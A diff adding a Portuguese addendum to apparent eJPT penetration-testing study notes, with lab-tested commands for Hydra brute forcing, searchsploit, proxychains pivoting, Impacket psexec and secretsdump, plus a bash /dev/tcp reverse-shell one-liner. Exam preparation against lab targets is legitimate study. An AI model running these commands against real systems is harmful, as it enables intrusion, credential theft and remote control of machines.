@@ -421,3 +421,108 @@ preferir login manual com credencial conhecida, ou msf/http_login, ou script pr�
 `nc -lvnp 4455` + `bash -i >& /dev/tcp/127.0.0.1/4455 0>&1` → **Connection received** ✅
 (o `nc` local é OpenBSD: sem `-e`; as variantes com `mkfifo` e `/dev/tcp` do §6 são as que valem).
 
+---
+
+# ADENDO 20/OUT — MUDANÇAS QUE VALEM COMANDO NOVO (verificado na máquina, 11:06-11:20)
+
+## E.1 — Wordlists: o msf NÃO lê `/usr/share` (novo, importante)
+
+O msfconsole é snap. `set PASS_FILE /usr/share/wordlists/rockyou.txt` **falha na validação**:
+```
+[-] Msf::OptionValidateError One or more options failed to validate: PASS_FILE.
+```
+| Ferramenta | Pode usar `/usr/share/wordlists`? | Onde apontar |
+|---|---|---|
+| msfconsole / msfvenom (snap) | ❌ | `/home/libertus/wordlists/pass/top10k.txt` |
+| hydra, gobuster, john, nmap `--script-args` | ✅ | qualquer caminho |
+| nmap/sqlmap lendo ARQUIVO (`-iL`, `-r`) | ❌ `/tmp` | `~/targets.txt`, `~/req.txt` |
+
+Tradução prática: no msf **nunca** colar `/usr/share/wordlists/rockyou.txt`.
+Colar `/home/libertus/wordlists/pass/top10k.txt` (ou `top1000.txt`) — testado, aceito, bruteforce roda.
+
+## E.2 — Hydra: como saber em 10 segundos se ele vai mentir
+
+Raiz do falso positivo (reproduzida hoje, medida): o formulário do DVWA responde
+`302` com **corpo vazio** — falha `Location: login.php`, acerto `Location: index.php`.
+A string `F=Login failed` nunca aparece no corpo → **todo palpite é "sucesso"**.
+Some a isso o `user_token` (CSRF), que muda por sessão.
+
+Teste antes de confiar:
+```bash
+curl -s -i -d "usuario=admin&senha=errado" http://IP/login.php | head -12
+# corpo com texto de erro ("incorrect", "invalid", "Login failed") -> hydra é confiável
+# só 302 vazio / só Location -> hydra VAI mentir: usar login manual, impacket ou msf
+```
+Prova de que o hydra funciona quando o form é honesto (teste de hoje, form sem CSRF, porta 8099):
+```
+[8099][http-post-form] host: 127.0.0.1 ... login: admin   password: password
+1 valid target successfully completed, 1 valid password found ✅   (3 tentativas, 1 segundo)
+```
+E a versão mentirosa, mesmo com `F=` correto no papel:
+```
+[8080][http-post-form] ... login: admin   password: errado   ← falso positivo
+```
+**Regra de exame:** hydra só em serviço com resposta clara (FTP, SSH, formulário sem CSRF).
+Acerto de hydra = hipótese. Confirma com `curl -i` / login real **antes de responder questão**.
+
+## E.3 — searchsploit AGORA EXISTE (antes era "AUSENTE")
+
+```bash
+searchsploit ms17-010                 # 6 resultados hoje: 42031.py (EternalBlue), 42315.py, 43970.rb...
+searchsploit -w apache 2.4.49         # com URL do exploit-db
+searchsploit -m 42315                 # copia o exploit pro diretório atual
+searchsploit -p 42315                 # caminho completo no disco
+searchsploit --update                 # git pull do exploitdb
+```
+Base: `~/exploitdb` (360 MB), binário `~/bin/searchsploit`, config `~/.searchsploit_rc`.
+Serve para: versão de serviço vista no nmap → exploit público → ler o script e adaptar
+(no eJPT a maioria se resolve com msf, mas Webmin/Drupal/plugaras antigas caem aqui).
+
+## E.4 — proxychains4 AGORA EXISTE (fecha o pivot fora do msf)
+
+```bash
+# 1) no msfconsole, com a sessão do host de borda em background:
+use auxiliary/server/socks_proxy
+set VERSION 5
+set SRVPORT 1080
+set SRVHOST 127.0.0.1
+run -j
+# 2) no terminal do Kali:
+proxychains4 nmap -sT -Pn -p22,80,445,8080 10.10.10.20
+proxychains4 -q hydra -l admin -P ~/wordlists/pass/top1000.txt 10.10.10.20 ssh
+proxychains4 curl -s http://10.10.10.20/
+```
+Config: `~/.local/etc/proxychains.conf` (strict_chain, `socks5 127.0.0.1 1080`, `proxy_dns`).
+Pitfalls: via SOCKS só `-sT` (connect) funciona; **sempre `-Pn`**; nmap sem porta explícita
+testa só 80/443 pelo proxy → `-p` sempre. UDP (SNMP) não passa.
+
+## E.5 — Impacket: o smbclient que a máquina não tem (validado hoje)
+
+```bash
+~/venvs/pentest/bin/smbclient.py usuario:'senha'@IP            # shell interativo: shares, use, ls, cat, get
+~/venvs/pentest/bin/psexec.py usuario:'senha'@IP               # SYSTEM se admin
+~/venvs/pentest/bin/wmiexec.py usuario:'senha'@IP              # alternativa ao psexec
+~/venvs/pentest/bin/secretsdump.py usuario:'senha'@IP          # hashes locais/SAM
+~/venvs/pentest/bin/smbclient.py guest@IP -no-pass             # anônimo
+```
+Limites reais (medidos hoje):
+- `-port` **só aceita 139/445**. Porta não padrão → `SMBConnection(ip, ip, sess_port=4450)`.
+- `cat` funciona no smbclient.py do impacket (≠ smbclient do Samba, que exige `more`).
+- `getFile(share, path, callback)` exige callback — não retorna bytes direto.
+- `msf smb_login` recusa usuário/senha vazios (`Invalid Cred details can't be blank`) → anônimo = impacket.
+
+## E.6 — Quanto tempo cada coisa leva (para não travar o exame)
+
+| Comando | Tempo real medido / estimado |
+|---|---|
+| `nmap -sT -Pn -p<portas> IP` | 0,06 s (4 portas, local) |
+| `gobuster dir` com `directory-list-2.3-small` (87k) | ~1-2 min por host (50 threads) |
+| `sqlmap --banner` com sessão válida | ~10 s até o banner |
+| `john --format=raw-md5` em 1.000 senhas | <1 s (12.800 p/s medido) |
+| `john` rockyou inteiro em md5 | **~18 min** |
+| `hydra` rockyou inteiro em SSH | **777-1943 h** — nunca fazer |
+| `nc` + `/dev/tcp` reverse shell | instantâneo |
+
+Regra: se o comando passa de 2 minutos, roda em background e segue para outro host.
+
+
